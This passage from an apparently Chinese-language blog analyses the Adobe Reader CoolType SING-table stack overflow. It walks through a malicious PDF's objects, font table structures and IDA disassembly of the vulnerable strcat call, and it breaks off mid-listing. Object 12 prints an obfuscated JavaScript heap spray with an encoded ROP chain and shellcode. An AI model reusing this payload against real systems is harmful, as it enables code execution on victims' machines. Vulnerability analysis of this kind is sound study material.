class="line"></span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 65</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    0 g</span><br><span class="line">    BT</span><br><span class="line">    /F1 32 Tf</span><br><span class="line">    32 Tc</span><br><span class="line">    1 0 0 1 32 773.872 Tm</span><br><span class="line">    (Hello World!) Tj</span><br><span class="line">    ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /FontDescriptor            //此对象为字体描述对象</span><br><span class="line">    /FontName /Cinema                //字体名称是Cinema</span><br><span class="line">    /Flags 131140</span><br><span class="line">    /FontBBox [-177 -269 1123 866]</span><br><span class="line">    /FontFile2 10 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">10 0 obj    //字体文件</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 40238</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 65932</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">                            表目录头</span><br><span class="line">              |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">    00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2 --+</span><br><span class="line">    00000010: B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  ._.c...p...VPCLT   |</span><br><span class="line">    00000020: D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  ..^........6cmap   |</span><br><span class="line">    00000030: A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  .......l...Xcvt    |</span><br><span class="line">    00000040: FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ...9........fpgm   |</span><br><span class="line">    00000050: E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  ......&amp;`....gasp   |</span><br><span class="line">    00000060: 00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  .......H....glyf   |</span><br><span class="line">    00000070: 0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA...&amp;....~hdmx   |</span><br><span class="line">    00000080: 34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4.!........Hhead   |TTF字体表目录项</span><br><span class="line">    00000090: DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  .......T...6hhea   |</span><br><span class="line">    000000a0: 10 45 08 6F 00 00 EB 4C 00 00 00 24 68 6D 74 78  .E.o...L...$hmtx   |</span><br><span class="line">    000000b0: 09 C6 8E B2 00 00 B4 C4 00 00 04 30 6B 65 72 6E  ...........0kern   |</span><br><span class="line">    000000c0: DC 52 D5 99 00 00 BD A0 00 00 2D 8A 6C 6F 63 61  .R........-.loca   |</span><br><span class="line">    000000d0: F3 CB D2 3D 00 00 BB 84 00 00 02 1A 6D 61 78 70  ...=........maxp   |</span><br><span class="line">    000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING   |&lt;-SING表，此漏洞相关的表</span><br><span class="line">    000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post   |</span><br><span class="line">    00000100: B4 5A 2F BB 00 00 B8 F4 00 00 02 8E 70 72 65 70  .Z/.........prep --+</span><br><span class="line">    00000110: 3B 07 F1 00 00 00 20 F8 00 00 05 68 00 00 01 00  ;..... ....h.... --+</span><br><span class="line">    00000120: 01 0E 00 01 00 00 00 00 00 00 00 3A F1 B9 F1 F4  ...........:....   |</span><br><span class="line">    00000130: 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C AC 86 F7 B5  ub.....J........   |</span><br><span class="line">    00000140: ED 50 17 29 5C 12 8D 01 4E 51 05 0E E7 CC BC CA  .P.)\...NQ......   |</span><br><span class="line">    00000150: 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D DB C2 4B 84  k....6.^E..&#125;..K.   |各个表内容</span><br><span class="line">    00000160: E8 67 8A 92 74 90 C8 3D 03 65 FE 80 4E E7 C7 42  .g..t..=.e..N..B   |</span><br><span class="line">    00000170: 89 8B DA 08 91 71 7A 3D 83 8E BD 60 AB 8F FA 53  .....qz=...`...S   |</span><br><span class="line">    ...........                                                                   |</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Action</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS 12 0 R     //对象12为包含javascript脚本的对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">12 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 4245</span><br><span class="line">    /Filter [/FlateDecode /ASCIIHexDecode]</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    var TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ = unescape;</span><br><span class="line">    var NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf&apos; );</span><br><span class="line">    var cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">    while (cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.length + 20 + 8 &lt; 65536) cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu+=cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI = cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ = KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI.substring(0, 65536/2);</span><br><span class="line">    while(LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.length &lt; 0x80000) LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ += LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ;</span><br><span class="line">    uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl = LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">    var vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW = new Array();</span><br><span class="line">    for (BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE=0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE&lt;0x1f0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE++) vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW[BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE]=uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl+&quot;s&quot;;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">13 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA 14 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">14 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 372</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span><br><span class="line">    &lt;config xmlns=&quot;http://www.xfa.org/schema/xci/2.6/&quot;&gt;</span><br><span class="line">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span><br><span class="line">    &lt;/config&gt;</span><br><span class="line">    &lt;template xmlns=&quot;http://www.xfa.org/schema/xfa-template/2.6/&quot;&gt;</span><br><span class="line">    &lt;subform name=&quot;form1&quot; layout=&quot;tb&quot; locale=&quot;en_US&quot;&gt;</span><br><span class="line">    &lt;pageSet&gt;&lt;/pageSet&gt;</span><br><span class="line">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref    //交叉引用表</span><br><span class="line">0 15    //说明下面的描述是从0号对象开始，数量为15</span><br><span class="line">0000000000 65535 f  //对象0的起始地址为00000000，产生号为65535，也是最大产生号，不可以再进行更改，f表示该对象状态为free</span><br><span class="line">0000000015 00000 n  //对象1的起始地址为00000015，产生号为00000，全零表明该对象未被修改过，n表示该对象在使用中</span><br><span class="line">0000000139 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000469 00000 n</span><br><span class="line">0000000503 00000 n</span><br><span class="line">0000000727 00000 n</span><br><span class="line">0000000853 00000 n</span><br><span class="line">0000001016 00000 n</span><br><span class="line">0000041370 00000 n</span><br><span class="line">0000041443 00000 n</span><br><span class="line">0000045816 00000 n</span><br><span class="line">0000045853 00000 n</span><br><span class="line"></span><br><span class="line">trailer     //尾部</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Size 15        //该PDF的对象数</span><br><span class="line">    /Root 1 0 R     //根对象的对象号为1</span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref</span><br><span class="line">46280       //交叉引用表的偏移</span><br><span class="line">%%EOF       //文件结束标志</span><br></pre></td></tr></table></figure>
<p><code>TTF表目录头</code>结构如下：<br><img src="/resources/2018/2018-06-01-00.jpg" alt="TTF表目录头结构"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                        表目录头</span><br><span class="line">          |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2</span><br><span class="line"></span><br><span class="line">TrueType字体用machintosh的轮廓字体资源的格式编码，有一个唯一的标记名&quot;sfnt&quot;。</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong><code>sfnt version</code></strong>：0x00010000(sfnt-1.0)</li>
<li><strong><code>numTables</code></strong>：0x0011(Dec:17) 有17个表</li>
<li><strong><code>searchRange</code></strong>：0x0100</li>
<li><strong><code>entrySelector</code></strong>：0x0004</li>
<li><strong><code>rangeShift</code></strong>：0x0010</li>
</ul>
</blockquote>
<p><code>TTF表目录项</code>结构如下：<br><img src="/resources/2018/2018-06-01-01.jpg" alt="TTF表目录项结构"></p>
<h3 id="0x32-SING表结构"><a href="#0x32-SING表结构" class="headerlink" title="0x32 SING表结构"></a>0x32 SING表结构</h3><p>&emsp;&emsp;<code>SING技术</code>是Adobe公司推出的针对<code>“外字”（Gaiji）</code>的解决方案，<code>外字</code>是<code>日语</code>中的意思，<code>中文</code>中就是<code>生僻字</code>的意思。SING允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（<code>glyphlet</code>）。这种格式通过Adobe公开的，且<code>基于OpenType</code>。SING（Smart INdependent Glyphlets，智能独立字形包）的规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。SING表结构文档真的不好找，一篇博客中说可以在这里<a href="https://www.adobe.com/devnet/opentype/gdk/topic.html" target="_blank" rel="noopener">Adobe Glyphlet Development Kit (GDK) for SING Gaiji Architecture</a>下载到一个名叫<code>GlyDevKit.zip</code>的压缩包，压缩包中的Gaiji SING Glyphlet spec.pdf文档中记录了有关SING表的一些规范，但是，可能由于时间问题，Adobe官网已经下载不到这个压缩包了，还好有关漏洞部分的内容，他的博客中已经提到。还可以在这里找到,<a href="https://github.com/adobe-type-tools/afdko/blob/develop/c/spot/sfnt_includes/sfnt_SING.h" target="_blank" rel="noopener">Adobe Font Development Kit for OpenType</a>。</p>
<p><code>SING表目录项</code>的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];        <span class="comment">//标记："SING"</span></span><br><span class="line">    ULONG checkSum;     <span class="comment">//校验和："0xD9BCC8B5"</span></span><br><span class="line">    ULONG offset;       <span class="comment">//表偏移："0x0000011c"</span></span><br><span class="line">    ULONG length;       <span class="comment">//数据长度："0x00001DDF"</span></span><br><span class="line">&#125;TableEntry;</span><br><span class="line"><span class="comment">//TrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING</span><br><span class="line">000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post</span><br><span class="line"></span><br><span class="line">53 49 4E 47   D9 BC C8 B5   00 00 01 1C   00 00 1D DF</span><br></pre></td></tr></table></figure>
<p>下表列出了TrueType字体中常见的表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">head           字体头                            字体的全局信息</span><br><span class="line">cmap           字符代码到图元的映射               把字符代码映射为图元索引</span><br><span class="line">glyf           图元数据                          图元轮廓定义以及网格调整指令</span><br><span class="line">maxp           最大需求表                        字体中所需内存分配情况的汇总数据</span><br><span class="line">mmtx           水平规格                          图元水平规格</span><br><span class="line">loca           位置表索引                        把元索引转换为图元的位置</span><br><span class="line">name           命名表                            版权说明、字体名、字体族名、风格名等等</span><br><span class="line">hmtx           水平布局                          字体水平布局星系：上高、下高、行间距、最大前进宽度、最小左支撑、最小右支撑</span><br><span class="line">kerm           字距调整表                        字距调整对的数组</span><br><span class="line">post           PostScript信息                    所有图元的PostScript   FontInfo目录项和PostScript名</span><br><span class="line">PCLT           PCL5数据                          HP PCL 5Printer Language的字体信息：字体数、宽度、x高度、风格、记号集等等</span><br><span class="line">OS/2           OS/2和Windows特有的规格           TrueType字体所需的规格集</span><br></pre></td></tr></table></figure>
<p>SING表内容的数据结构如下图所示：</p>
<div align="left"><img src="/resources/2018/2018-06-01-02.jpg" width="70%" height="50%" alt="SING表结构"></div>

<p>上面在分析PDF内容的时候已经将<code>SING表</code>和<code>SING表目录项</code>标出来了。</p>
<h3 id="0x33-漏洞触发"><a href="#0x33-漏洞触发" class="headerlink" title="0x33 漏洞触发"></a>0x33 漏洞触发</h3><h4 id="1、静态分析"><a href="#1、静态分析" class="headerlink" title="1、静态分析"></a>1、静态分析</h4><p>用IDA打开<code>CoolType.dll</code>库，Shift+F12打开<code>String窗口</code>，搜索<code>&quot;SING&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819CE34 0000000C C quotesingle                               </span><br><span class="line">.rdata:0819DA2C 0000000D C missing maxp                              </span><br><span class="line">.rdata:0819DB4C 00000005 C SING                                      </span><br><span class="line">.rdata:081A6F38 00000013 C Error parsing CMap                        </span><br><span class="line">.rdata:081A6F4C 00000016 C missing codespace map</span><br></pre></td></tr></table></figure>
<p>双击上面的<code>第三个条目</code>，跳转到下面所示位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0819DB4C ; char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &apos;SING&apos;,0             ; DATA XREF: sub_8015AD9+D2o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7Bo ...</span><br></pre></td></tr></table></figure>
<p>用鼠标点击aString[],Ctrl+x查看<code>交叉引用</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Direction  Type  Address          Text  </span><br><span class="line">Up         o     sub_803DCF9+7B   push    offset aSing    ; &quot;SING&quot;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;双击这条就可以定位到解析存在漏洞的地方。下面就是<code>CoolType</code>库对<code>SING表</code>的解析代码，当<code>uniqueName</code>字段为超长字符串时，执行<code>strcat()</code>前未对其长度进行检测，执行<code>strcat()</code>后，会将该字段复制到固定大小的栈空间，最终<code>导致栈溢出</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0803DCF9     <span class="keyword">push</span>    <span class="built_in">ebp</span>                            <span class="comment">; 父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA     <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                      <span class="comment">; 分配栈空间0x104</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00     <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>+<span class="number">104h</span>+uniqueName_buf] <span class="comment">; esp-4赋给ebp,而不是esp-4处的值赋给ebp,后面strcat会把执行结果保存在以ebp为起始地址的栈空间中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04     <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie <span class="comment">; security_cookie-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                <span class="comment">; security_cookie^ebp-&gt;eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>   <span class="comment">; 将和ebp异或完的security_cookie存到栈上父函数ebp之前的4字节中</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11     <span class="keyword">push</span>    <span class="number">4Ch</span>                     <span class="comment">; __EH_prolog3_catch函数中分配栈空间的大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13     <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54 <span class="comment">; 调用__security_check_cookie函数的代码段起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18     <span class="keyword">call</span>    __EH_prolog3_catch      <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]</span><br><span class="line"><span class="symbol">.text:</span>0803DD23     <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0803DD29     <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>0803DD2F     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35     <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A     <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43     <span class="keyword">jz</span>      loc_803DF00</span><br><span class="line"><span class="symbol">.text:</span>0803DD49     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F     <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F <span class="comment">;&#125; // starts at 803DD40</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57     <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line"><span class="symbol">.text:</span>0803DD5D     <span class="keyword">push</span>    offset aName    <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62     <span class="keyword">push</span>    <span class="built_in">edi</span>             <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A     <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F     <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72     <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span 